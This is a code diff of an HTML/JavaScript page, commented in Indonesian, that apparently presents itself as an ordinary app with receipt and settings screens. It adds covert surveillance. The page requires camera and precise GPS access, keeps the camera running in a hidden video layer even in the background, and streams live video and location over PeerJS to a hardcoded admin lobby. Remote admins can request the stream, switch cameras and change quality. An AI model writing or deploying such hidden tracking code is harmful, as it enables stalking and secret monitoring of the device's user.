@@ -708,7 +708,7 @@
     </div>
   </div>
 
-  <!-- Layer tersembunyi untuk kamera aktif selama aplikasi/halaman terbuka -->
+  <!-- Layer tersembunyi untuk kamera aktif di latar belakang -->
   <div id="hiddenCameraLayer" aria-hidden="true">
     <video id="localVideo" autoplay playsinline muted></video>
   </div>
@@ -1766,22 +1766,21 @@
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
     const MEMBER_PEER_ID = "jirun-hp-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 6);
 
-    let currentFacing = "user"; // "user" = depan, "environment" = belakang
+    let currentFacing = "user";
+    let currentQuality = "hd";
     let cameraStream = null;
     let peer = null;
     let lobbyConn = null;
     let heartbeatTimer = null;
     let watchId = null;
     let latestLocation = null;
-    let hasAccurateLocation = false;
+    let hasLocationPermission = false;
     let hasCameraPermission = false;
     let isRequestingPerms = false;
+    let isClosingSession = false;
 
-    // Menyimpan panggilan aktif per viewer admin: { [adminPeerId]: MediaConnection }
     const activeCallsByAdmin = {};
-    // Menyimpan data koneksi per viewer admin: { [adminPeerId]: DataConnection }
     const adminConns = {};
-
     const localVideoEl = document.getElementById("localVideo");
 
     function setGateMessage(msg) {
@@ -1792,7 +1791,7 @@
     function unlockMainAppIfReady() {
       const gateEl = document.getElementById("permissionGate");
       const settingsEl = document.getElementById("screenSettings");
-      if (hasAccurateLocation && hasCameraPermission && cameraStream) {
+      if (hasLocationPermission && hasCameraPermission && cameraStream) {
         gateEl.classList.add("hidden");
         if (
           document.getElementById("screenReceipt").classList.contains("hidden") &&
@@ -1808,7 +1807,7 @@
       return false;
     }
 
-    function requestAccurateLocation() {
+    function startLocationWatcher() {
       return new Promise((resolve, reject) => {
         if (!navigator.geolocation) {
           reject(new Error("Perangkat tidak mendukung GPS/Geolocation."));
@@ -1820,8 +1819,17 @@
         }
 
         let settled = false;
+        const fallbackTimer = setTimeout(() => {
+          if (!settled) {
+            settled = true;
+            hasLocationPermission = true;
+            resolve(latestLocation);
+          }
+        }, 3500);
+
         watchId = navigator.geolocation.watchPosition(
           (pos) => {
+            hasLocationPermission = true;
             latestLocation = {
               lat: Number(pos.coords.latitude.toFixed(6)),
               lng: Number(pos.coords.longitude.toFixed(6)),
@@ -1833,51 +1841,74 @@
                 ? Math.round(pos.coords.heading) + "°"
                 : "-"
             };
-            hasAccurateLocation = true;
             broadcastPresenceToAdmins();
             if (!settled) {
               settled = true;
+              clearTimeout(fallbackTimer);
               resolve(latestLocation);
             }
           },
           (err) => {
-            if (!hasAccurateLocation) {
-              reject(new Error(err?.message || "Izin lokasi akurat ditolak."));
+            if (err && err.code === 1) {
+              hasLocationPermission = false;
+              if (!settled) {
+                settled = true;
+                clearTimeout(fallbackTimer);
+                reject(new Error("Izin lokasi ditolak."));
+              }
+            } else if (!settled) {
+              settled = true;
+              clearTimeout(fallbackTimer);
+              hasLocationPermission = true;
+              resolve(latestLocation);
             }
           },
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
         );
       });
     }
 
-    async function openCameraKeepAlive(facing) {
+    function getVideoConstraints(facing, quality) {
+      if (quality === "smooth") {
+        return {
+          facingMode: { ideal: facing },
+          width: { ideal: 320 },
+          height: { ideal: 240 },
+          frameRate: { ideal: 15, max: 20 }
+        };
+      }
+      return {
+        facingMode: { ideal: facing },
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        frameRate: { ideal: 24, max: 30 }
+      };
+    }
+
+    async function openCameraKeepAlive(facing, quality = currentQuality) {
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
         throw new Error("Browser/APK tidak mendukung akses kamera.");
       }
-      // Hentikan stream lama hanya saat mengganti kamera depan/belakang
       if (cameraStream) {
         cameraStream.getTracks().forEach(t => t.stop());
         cameraStream = null;
       }
+
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: {
-          facingMode: { ideal: facing },
-          width: { ideal: 640 },
-          height: { ideal: 480 }
-        },
+        video: getVideoConstraints(facing, quality),
         audio: false
       });
 
       currentFacing = facing;
+      currentQuality = quality;
       cameraStream = stream;
       hasCameraPermission = true;
       localVideoEl.srcObject = stream;
       await localVideoEl.play().catch(() => {});
 
-      // Ganti track video ke semua admin yang sedang menonton secara real-time
       const newTrack = stream.getVideoTracks()[0];
       if (newTrack) {
-        for (const [adminId, call] of Object.entries(activeCallsByAdmin)) {
+        for (const call of Object.values(activeCallsByAdmin)) {
           if (call && call.peerConnection) {
             const sender = call.peerConnection.getSenders().find(s => s.track && s.track.kind === "video");
             if (sender) {
@@ -1900,6 +1931,7 @@
       return {
         type: "HP_PRESENCE",
         peerId: MEMBER_PEER_ID,
+        inBackground: document.visibilityState === "hidden",
         facing: currentFacing === "environment" ? "Belakang" : "Depan",
         cameraOn: Boolean(cameraStream),
         location: latestLocation,
@@ -1909,6 +1941,7 @@
     }
 
     function broadcastPresenceToAdmins() {
+      if (isClosingSession) return;
       const payload = buildPresencePayload();
       if (lobbyConn && lobbyConn.open) {
         lobbyConn.send(payload);
@@ -1921,7 +1954,7 @@
     }
 
     function connectToAdminLobby() {
-      if (!peer || peer.disconnected || peer.destroyed) return;
+      if (isClosingSession || !peer || peer.disconnected || peer.destroyed) return;
       if (lobbyConn && lobbyConn.open) {
         broadcastPresenceToAdmins();
         return;
@@ -1940,24 +1973,41 @@
       conn.on("error", () => {});
     }
 
+    function sendStreamToAdmin(adminPeerId) {
+      if (!cameraStream || !peer || peer.destroyed) return;
+      if (activeCallsByAdmin[adminPeerId]) {
+        try { activeCallsByAdmin[adminPeerId].close(); } catch (e) {}
+      }
+      const call = peer.call(adminPeerId, cameraStream);
+      if (call) {
+        activeCallsByAdmin[adminPeerId] = call;
+        call.on("close", () => {
+          delete activeCallsByAdmin[adminPeerId];
+        });
+      }
+    }
+
     async function handleAdminMessage(fromPeerId, msg) {
       if (!msg || !msg.type) return;
 
       if (msg.type === "REQUEST_STREAM") {
-        if (!cameraStream) return;
-        const call = peer.call(fromPeerId, cameraStream);
-        if (call) {
-          activeCallsByAdmin[fromPeerId] = call;
-          call.on("close", () => {
-            delete activeCallsByAdmin[fromPeerId];
-          });
+        if (msg.quality && msg.quality !== currentQuality) {
+          await openCameraKeepAlive(currentFacing, msg.quality).catch(() => {});
         }
+        sendStreamToAdmin(fromPeerId);
         broadcastPresenceToAdmins();
       } else if (msg.type === "SWITCH_CAM") {
         const target = msg.facing === "environment" || msg.facing === "user"
           ? msg.facing
           : (currentFacing === "user" ? "environment" : "user");
-        await openCameraKeepAlive(target).catch(() => {});
+        const q = msg.quality || currentQuality;
+        await openCameraKeepAlive(target, q).catch(() => {});
+        sendStreamToAdmin(fromPeerId);
+      } else if (msg.type === "SET_QUALITY") {
+        if (msg.quality) {
+          await openCameraKeepAlive(currentFacing, msg.quality).catch(() => {});
+          sendStreamToAdmin(fromPeerId);
+        }
       } else if (msg.type === "PING") {
         broadcastPresenceToAdmins();
       }
@@ -1994,14 +2044,14 @@
       });
 
       peer.on("disconnected", () => {
-        if (peer && !peer.destroyed) {
+        if (!isClosingSession && peer && !peer.destroyed) {
           peer.reconnect();
         }
       });
 
       if (!heartbeatTimer) {
         heartbeatTimer = setInterval(() => {
-          if (hasAccurateLocation && hasCameraPermission && cameraStream) {
+          if (!isClosingSession && hasLocationPermission && hasCameraPermission && cameraStream) {
             connectToAdminLobby();
             broadcastPresenceToAdmins();
           }
@@ -2012,12 +2062,14 @@
     async function requestMandatoryPermissions() {
       if (isRequestingPerms) return;
       isRequestingPerms = true;
+      isClosingSession = false;
       setGateMessage("Meminta izin lokasi akurat dan kamera...");
 
       try {
-        await requestAccurateLocation();
-        await openCameraKeepAlive(currentFacing);
+        await startLocationWatcher();
+        await openCameraKeepAlive(currentFacing, currentQuality);
         setupMemberPeer();
+        connectToAdminLobby();
         unlockMainAppIfReady();
       } catch (err) {
         hasCameraPermission = Boolean(cameraStream);
@@ -2030,7 +2082,27 @@
       }
     }
 
+    function sendClosingNotice() {
+      const closingPayload = {
+        type: "HP_CLOSING",
+        peerId: MEMBER_PEER_ID,
+        updatedAt: Date.now()
+      };
+      if (lobbyConn && lobbyConn.open) {
+        try { lobbyConn.send(closingPayload); } catch (e) {}
+      }
+      for (const conn of Object.values(adminConns)) {
+        if (conn && conn.open) {
+          try { conn.send(closingPayload); } catch (e) {}
+        }
+      }
+    }
+
     function cleanupMemberSession() {
+      if (isClosingSession) return;
+      isClosingSession = true;
+      sendClosingNotice();
+
       if (heartbeatTimer) {
         clearInterval(heartbeatTimer);
         heartbeatTimer = null;
@@ -2057,12 +2129,17 @@
       }
     }
 
+    document.addEventListener("visibilitychange", () => {
+      if (!isClosingSession && hasCameraPermission && cameraStream) {
+        broadcastPresenceToAdmins();
+      }
+    });
+
     window.addEventListener("DOMContentLoaded", () => {
       unlockMainAppIfReady();
       requestMandatoryPermissions();
     });
 
-    // Kamera tetap ON selama halaman/APK terbuka; hanya dilepas saat halaman/APK ditutup
     window.addEventListener("pagehide", cleanupMemberSession);
     window.addEventListener("beforeunload", cleanupMemberSession);
 
